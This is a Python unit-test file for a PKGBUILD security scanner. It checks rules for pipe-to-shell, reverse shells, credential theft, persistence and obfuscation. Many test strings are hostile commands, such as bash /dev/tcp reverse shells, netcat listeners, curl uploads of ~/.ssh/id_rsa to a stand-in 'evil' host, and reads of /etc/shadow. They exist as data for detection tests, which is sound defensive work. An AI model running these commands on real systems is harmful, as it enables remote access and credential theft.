import unittest

from atlas.gems.arch import pkgbuild_audit as audit


def rules_for(text):
    return {f['rule'] for f in audit.scan(text)}


# A normal, benign PKGBUILD — must produce ZERO findings (false-positive guard).
CLEAN_PKGBUILD = """\
# Maintainer: Someone <someone@example.com>
pkgname=foo
pkgver=1.2.3
pkgrel=1
arch=('x86_64')
url="https://example.com/foo"
depends=('curl' 'glibc')
source=("https://example.com/foo-$pkgver.tar.gz")
sha256sums=('a7f3c1b2e4d5968708192a3b4c5d6e7f8091a2b3c4d5e6f70819203a4b5c6d7e')

build() {
  cd "$srcdir/foo-$pkgver"
  ./configure --prefix=/usr
  make
}

package() {
  cd "$srcdir/foo-$pkgver"
  make DESTDIR="$pkgdir" install
  rm -rf "$srcdir/foo-$pkgver/tmp"
  chmod 755 "$pkgdir/usr/bin/foo"
}
"""


class CleanPkgbuildTest(unittest.TestCase):
    def test_benign_pkgbuild_has_no_findings(self):
        self.assertEqual([], audit.scan(CLEAN_PKGBUILD))

    def test_empty_text(self):
        self.assertEqual([], audit.scan(''))
        self.assertEqual([], audit.scan(None))


class RuleFiringTest(unittest.TestCase):
    def test_pipe_to_shell(self):
        self.assertIn('pipe_to_shell', rules_for('curl https://evil.sh/x | bash'))
        self.assertIn('pipe_to_shell', rules_for('sh -c "$(wget -O- http://evil/x)"'))

    def test_base64(self):
        self.assertIn('base64', rules_for('echo aGk= | base64 -d | sh'))

    def test_base64_blob_flagged_but_not_hex_checksum(self):
        # a real base64 blob (>=40 chars, has +,/,=) fires
        self.assertIn('base64_blob', rules_for("payload='TVqQAAMAAAAEAAAA//8AALgAA+ABcQK3kAAAAEAAAA+B/gK3kw=='"))
        # a 64-char lowercase-hex sha256sum does NOT
        self.assertNotIn('base64_blob',
                         rules_for("sha256sums=('a7f3c1b2e4d5968708192a3b4c5d6e7f8091a2b3c4d5e6f70819203a4b5c6d7e')"))

    def test_eval_and_hex_escapes(self):
        self.assertIn('eval', rules_for('eval "$payload"'))
        self.assertIn('hex_escapes', rules_for('printf "\\x90\\x90\\x90\\x90\\x90"'))

    def test_network_cmd_fires_on_invocation_not_on_dep_name(self):
        self.assertIn('network_cmd', rules_for('curl -sL http://evil/x -o /tmp/x'))
        self.assertIn('network_cmd', rules_for('cat </dev/tcp/10.0.0.1/4444'))
        # 'curl' as a dependency / pkgname must NOT trip it
        self.assertNotIn('network_cmd', rules_for("depends=('curl' 'wget')"))
        self.assertNotIn('network_cmd', rules_for('pkgname=curl'))

    def test_sensitive_paths(self):
        self.assertIn('sensitive_path', rules_for('echo "$KEY" >> ~/.ssh/authorized_keys'))
        self.assertIn('sensitive_path', rules_for('cp x /etc/sudoers.d/foo'))
        self.assertIn('sensitive_path', rules_for('echo evil >> ~/.bashrc'))

    def test_setuid(self):
        self.assertIn('setuid', rules_for('chmod 4755 "$pkgdir/usr/bin/foo"'))
        self.assertIn('setuid', rules_for('chmod u+s /usr/bin/foo'))
        # normal mode does not
        self.assertNotIn('setuid', rules_for('chmod 644 "$pkgdir/etc/foo.conf"'))

    def test_sudo(self):
        self.assertIn('sudo', rules_for('sudo rm /etc/important'))

    def test_rm_rf_targets_only_dangerous_paths(self):
        self.assertIn('rm_rf', rules_for('rm -rf ~'))
        self.assertIn('rm_rf', rules_for('rm -rf /'))
        self.assertIn('rm_rf', rules_for('rm -rf "$HOME/.config"'))
        # the ubiquitous build-dir cleanup must NOT fire
        self.assertNotIn('rm_rf', rules_for('rm -rf "$srcdir/foo"'))
        self.assertNotIn('rm_rf', rules_for('rm -rf "${pkgdir}/usr/share/doc"'))

    # Atomic Arch (June 2026) campaign-specific rules:

    def test_npm_install_unknown(self):
        self.assertIn('npm_install_unknown', rules_for('npm install atomic-lockfile minimist chalk'))
        self.assertIn('npm_install_unknown', rules_for('bun install js-digest'))
        self.assertIn('npm_install_unknown', rules_for('pnpm add some-pkg'))
        self.assertIn('npm_install_unknown', rules_for('yarn add malware'))
        self.assertIn('npm_install_unknown', rules_for('npm i some-package'))
        # 'npm run' and bare 'npm --version' must NOT fire
        self.assertNotIn('npm_install_unknown', rules_for('npm run build'))
        self.assertNotIn('npm_install_unknown', rules_for('npm --version'))
        self.assertNotIn('npm_install_unknown', rules_for("depends=('npm')"))

    def test_skip_checksum(self):
        self.assertIn('skip_checksum', rules_for("sha256sums=('SKIP')"))
        self.assertIn('skip_checksum', rules_for('b2sums=("SKIP" "abc123")'))
        # a PKGBUILD that just mentions the word SKIP in a comment must NOT fire
        self.assertNotIn('skip_checksum', rules_for('# do not use SKIP unless it is a VCS'))

    def test_temp_upload_service(self):
        self.assertIn('temp_upload_service', rules_for('curl https://temp.sh/upload -T stolen.tar'))
        self.assertIn('temp_upload_service', rules_for('wget transfer.sh/upload'))
        self.assertIn('temp_upload_service', rules_for('curl https://0x0.st -F file=@data'))
        self.assertIn('temp_upload_service', rules_for('nc termbin.com 9999'))

    def test_systemd_service_install(self):
        self.assertIn('systemd_service_install', rules_for('systemctl enable myservice'))
        self.assertIn('systemd_service_install', rules_for('systemctl start myservice'))
        self.assertIn('systemd_service_install', rules_for('systemctl daemon-reload'))


class CompetitiveResearchRuleTest(unittest.TestCase):
    """Rules added from the 2026-06-16 competitive-research plan (Theme 1). Each rule gets a
    positive-firing case and a false-positive-safe case."""

    # --- Reverse shells --- #
    def test_reverse_shell_bash(self):
        self.assertIn('reverse_shell_bash', rules_for('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))
        self.assertIn('reverse_shell_bash', rules_for('exec 5<>/dev/tcp/evil.host/9001'))
        # a TCP-related comment / unrelated /dev path does not fire
        self.assertNotIn('reverse_shell_bash', rules_for('install -Dm644 foo /dev/null'))

    def test_reverse_shell_lang(self):
        self.assertIn('reverse_shell_lang', rules_for("python -c 's.connect((h,p))'  # socket.connect"))
        self.assertIn('reverse_shell_lang', rules_for('perl -e "fsockopen()"'))
        self.assertIn('reverse_shell_lang', rules_for('ruby -e "TCPSocket.open(h,p)"'))
        self.assertNotIn('reverse_shell_lang', rules_for('make connect-test'))

    def test_reverse_shell_listener(self):
        self.assertIn('reverse_shell_listener', rules_for('nc -lvp 4444 -e /bin/sh'))
        self.assertIn('reverse_shell_listener', rules_for('ncat -l 9001'))
        self.assertIn('reverse_shell_listener', rules_for('socat TCP-LISTEN:4444 EXEC:/bin/bash'))
        # downloading with nc (no -l) is network_cmd, not a listener
        self.assertNotIn('reverse_shell_listener', rules_for('depends=("openbsd-netcat")'))

    # --- Credential theft --- #
    def test_credential_harvest(self):
        self.assertIn('credential_harvest', rules_for('cp -r ~/.gnupg /tmp/loot'))
        self.assertIn('credential_harvest', rules_for('cat /etc/shadow'))
        self.assertIn('credential_harvest', rules_for('tar czf x ~/.mozilla/firefox'))
        self.assertNotIn('credential_harvest', rules_for('install -d "$pkgdir/usr/share/keyrings"'))

    def test_ssh_key_exfil(self):
        self.assertIn('ssh_key_exfil', rules_for('curl -F f=@~/.ssh/id_rsa http://evil/u'))
        self.assertIn('ssh_key_exfil', rules_for('cat ~/.ssh/id_ed25519 > /tmp/out'))
        # reading a key without sending it is sensitive_path territory, not exfil
        self.assertNotIn('ssh_key_exfil', rules_for('chmod 600 "$pkgdir/etc/ssh/id_rsa"'))

    # --- Persistence --- #
    def test_systemd_timer_create(self):
        self.assertIn('systemd_timer_create',
                      rules_for('install -Dm644 evil.timer "$pkgdir/usr/lib/systemd/system/evil.timer"'))
        # a plain .service install does not fire the timer rule
        self.assertNotIn('systemd_timer_create',
                         rules_for('install -Dm644 foo.service "$pkgdir/usr/lib/systemd/system/foo.service"'))

    def test_cron_persist(self):
        self.assertIn('cron_persist', rules_for('echo "* * * * * sh" | crontab -'))
        self.assertIn('cron_persist', rules_for('cp job "$pkgdir/etc/cron.d/job"'))
        self.assertNotIn('cron_persist', rules_for("depends=('cronie')"))

    def test_rc_local(self):
        self.assertIn('rc_local', rules_for('echo /tmp/x >> /etc/rc.local'))
        self.assertIn('rc_local', rules_for('systemctl enable rc-local.service'))
        self.assertNotIn('rc_local', rules_for('cp README "$pkgdir/usr/share/doc/local.md"'))

    def test_shell_function_inject(self):
        self.assertIn('shell_function_inject', rules_for('echo "evil() { :; }" >> ~/.bashrc'))
        self.assertIn('shell_function_inject', rules_for('cat payload >> "$HOME/.zshrc"'))
        # reading/sourcing a shell config (no append) does not fire this rule
        self.assertNotIn('shell_function_inject', rules_for('source ~/.bashrc'))

    # --- Obfuscation --- #
    def test_printf_assembly(self):
        self.assertIn('printf_assembly', rules_for(r'eval $(printf "\x2f\x62\x69\x6e")'))
        self.assertIn('printf_assembly', rules_for(r'printf "\57\142\151\156"'))
        # a normal printf of text does not fire
        self.assertNotIn('printf_assembly', rules_for('printf "Building %s\\n" "$pkgname"'))

    def test_gzip_payload(self):
        self.assertIn('gzip_payload', rules_for('zcat payload.gz | bash'))
        self.assertIn('gzip_payload', rules_for('gunzip -c x.gz | sh'))
        # extracting a tarball normally does not fire
        self.assertNotIn('gzip_payload', rules_for('tar xzf "$pkgname-$pkgver.tar.gz"'))

    def test_xxd_decode(self):
        self.assertIn('xxd_decode', rules_for('xxd -r -p hex.txt | sh'))
        self.assertNotIn('xxd_decode', rules_for('xxd firmware.bin > dump.txt'))

    # --- Dependency confusion --- #
    def test_dep_confusion(self):
        self.assertIn('dep_confusion', rules_for("provides=('bash' 'coreutils')"))
        self.assertIn('dep_confusion', rules_for("conflicts=('systemd')"))
        # depending on a core package is normal; providing your own name is fine
        self.assertNotIn('dep_confusion', rules_for("depends=('glibc' 'systemd')"))
        self.assertNotIn('dep_confusion', rules_for("provides=('libfoo.so')"))

    # --- Weak integrity --- #
    def test_weak_checksum(self):
        self.assertIn('weak_checksum', rules_for("md5sums=('d41d8cd98f00b204e9800998ecf8427e')"))
        self.assertIn('weak_checksum', rules_for("sha1sums=('da39a3ee5e6b4b0d3255bfef95601890afd80709')"))
        # the strong checksums in CLEAN_PKGBUILD do not fire
        self.assertNotIn('weak_checksum', rules_for("sha256sums=('abc')"))
        self.assertNotIn('weak_checksum', rules_for("b2sums=('abc')"))

    # --- http source --- #
    def test_http_source(self):
        self.assertIn('http_source', rules_for('source=("http://example.com/foo.tar.gz")'))
        # https is fine; git+http is verified by commit hash; localhost is harmless
        self.assertNotIn('http_source', rules_for('source=("https://example.com/foo.tar.gz")'))
        self.assertNotIn('http_source', rules_for('source=("git+http://example.com/foo.git#commit=abc")'))
        self.assertNotIn('http_source', rules_for('curl http://localhost:8080/health'))

    # --- Privilege escalation --- #
    def test_suid_capability(self):
        self.assertIn('suid_capability', rules_for('setcap cap_setuid+ep "$pkgdir/usr/bin/foo"'))
        self.assertIn('suid_capability', rules_for('setcap cap_net_raw=ep /usr/bin/ping'))
        # a benign capability (cap_net_bind_service) does not fire
        self.assertNotIn('suid_capability', rules_for('setcap cap_net_bind_service=+ep /usr/bin/foo'))

    def test_ld_preload(self):
        self.assertIn('ld_preload', rules_for('LD_PRELOAD=/tmp/evil.so /usr/bin/foo'))
        self.assertIn('ld_preload', rules_for('echo /tmp/evil.so > /etc/ld.so.preload'))
        self.assertNotIn('ld_preload', rules_for('export LD_LIBRARY_PATH=/usr/lib'))


class RuleMetadataTest(unittest.TestCase):
    """Provenance side map (docs/plans/2026-06-16-audit-rule-maintenance.md, step a)."""

    def _rule_ids(self):
        return {rule_id for rule_id, *_ in audit._RULES}

    def test_every_meta_key_is_a_real_rule(self):
        rule_ids = self._rule_ids()
        for key in audit._RULE_META:
            self.assertIn(key, rule_ids, f'_RULE_META references unknown rule {key!r}')

    def test_every_campaign_rule_has_a_source(self):
        for rule_id, meta in audit._RULE_META.items():
            if meta['kind'] == audit.CAMPAIGN:
                self.assertTrue(meta.get('source'), f'campaign rule {rule_id!r} must record a source')

    def test_meta_kinds_are_valid(self):
        for rule_id, meta in audit._RULE_META.items():
            self.assertIn(meta['kind'], (audit.EVERGREEN, audit.CAMPAIGN), rule_id)

    def test_accessor_defaults_for_baseline_rules(self):
        # An original hand-written rule (not in the side map) is the evergreen/no-source baseline.
        self.assertNotIn('eval', audit._RULE_META)
        meta = audit.rule_metadata('eval')
        self.assertEqual(meta, {'kind': audit.EVERGREEN, 'added': None, 'source': None})

    def test_accessor_returns_recorded_provenance(self):
        meta = audit.rule_metadata('npm_install_unknown')
        self.assertEqual(meta['kind'], audit.CAMPAIGN)
        self.assertTrue(meta['added'] and meta['source'])
        derived = audit.rule_metadata('reverse_shell_bash')
        self.assertEqual(derived['kind'], audit.EVERGREEN)
        self.assertEqual(derived['added'], '2026-06-16')
        self.assertTrue(derived['source'])

    def test_counts_add_up(self):
        # 2 campaign rules, 17 evergreen rules derived from ks-aur-scanner.
        campaign = [r for r, m in audit._RULE_META.items() if m['kind'] == audit.CAMPAIGN]
        evergreen_recorded = [r for r, m in audit._RULE_META.items() if m['kind'] == audit.EVERGREEN]
        self.assertEqual(len(campaign), 2)
        self.assertEqual(len(evergreen_recorded), 17)
        self.assertEqual(len(audit._RULE_META), 19)


class ScanMechanicsTest(unittest.TestCase):
    def test_comment_lines_are_skipped(self):
        self.assertEqual([], audit.scan('# you should never do: curl evil | bash'))

    def test_findings_carry_line_numbers_and_are_sorted(self):
        text = "pkgname=foo\ncurl -sL http://evil | bash\neval \"$x\"\n"
        findings = audit.scan(text)
        self.assertTrue(findings)
        line_nos = [f['line_no'] for f in findings]
        self.assertEqual(line_nos, sorted(line_nos))
        self.assertTrue(all('why' in f and 'severity' in f for f in findings))

    def test_diff_empty_when_identical(self):
        self.assertEqual('', audit.diff('pkgname=foo\npkgver=1\n', 'pkgname=foo\npkgver=1\n'))

    def test_diff_shows_added_and_removed(self):
        d = audit.diff('pkgver=1\n', 'pkgver=2\ncurl x | bash\n')
        self.assertIn('-pkgver=1', d)
        self.assertIn('+pkgver=2', d)
        self.assertIn('+curl x | bash', d)

    def test_diff_truncates_long_output(self):
        old = '\n'.join(f'line{i}' for i in range(500))
        new = '\n'.join(f'changed{i}' for i in range(500))
        d = audit.diff(old, new, max_lines=50)
        self.assertIn('diff truncated', d)
        self.assertLessEqual(len(d.splitlines()), 51)

    def test_summarize(self):
        findings = audit.scan("curl -sL http://evil | bash\n")
        s = audit.summarize(findings)
        self.assertEqual(s['total'], s['warn'] + s['info'])
        self.assertGreaterEqual(s['warn'], 1)

    def test_diff_lines_empty_when_identical(self):
        self.assertEqual([], audit.diff_lines('pkgver=1\n', 'pkgver=1\n'))

    def test_diff_lines_classifies_each_line(self):
        rows = audit.diff_lines('pkgver=1\n', 'pkgver=2\n')
        kinds = {r['kind'] for r in rows}
        self.assertEqual({'meta', 'hunk', 'add', 'del'}, kinds)
        added = [r['text'] for r in rows if r['kind'] == 'add']
        removed = [r['text'] for r in rows if r['kind'] == 'del']
        self.assertTrue(any(t.startswith('+pkgver=2') for t in added))
        self.assertTrue(any(t.startswith('-pkgver=1') for t in removed))
        # context lines (unchanged) keep their leading space and are tagged 'ctx'
        ctx = audit.diff_lines('a\nb\nc\n', 'a\nX\nc\n')
        self.assertTrue(any(r['kind'] == 'ctx' and r['text'] == ' a' for r in ctx))

    def test_diff_lines_truncates_with_a_meta_marker(self):
        old = '\n'.join(f'line{i}' for i in range(500))
        new = '\n'.join(f'changed{i}' for i in range(500))
        rows = audit.diff_lines(old, new, max_lines=50)
        self.assertEqual(51, len(rows))                       # max_lines + the truncation marker
        self.assertEqual('meta', rows[-1]['kind'])
        self.assertIn('truncated', rows[-1]['text'])

    def test_diff_lines_without_annotate_has_no_findings_key(self):
        rows = audit.diff_lines('pkgver=1\n', 'pkgver=1\ncurl x | bash\n')
        added = [r for r in rows if r['kind'] == 'add']
        self.assertTrue(added)
        self.assertNotIn('findings', added[0])

    def test_diff_lines_annotate_flags_suspicious_added_lines(self):
        rows = audit.diff_lines('pkgver=1\n', 'pkgver=1\ncurl x | bash\n', annotate=True)
        added = [r for r in rows if r['kind'] == 'add']
        self.assertEqual(1, len(added))
        rule_ids = {f['rule'] for f in added[0]['findings']}
        self.assertIn('pipe_to_shell', rule_ids)

    def test_diff_lines_annotate_benign_added_line_has_empty_findings(self):
        rows = audit.diff_lines('pkgver=1\n', 'pkgver=2\n', annotate=True)
        added = [r for r in rows if r['kind'] == 'add']
        self.assertEqual(1, len(added))
        self.assertEqual([], added[0]['findings'])

    def test_diff_lines_annotate_does_not_flag_removed_or_context_lines(self):
        rows = audit.diff_lines('curl x | bash\na\nb\n', 'a\nb\nc\n', annotate=True)
        for r in rows:
            if r['kind'] != 'add':
                self.assertNotIn('findings', r)


if __name__ == '__main__':
    unittest.main()
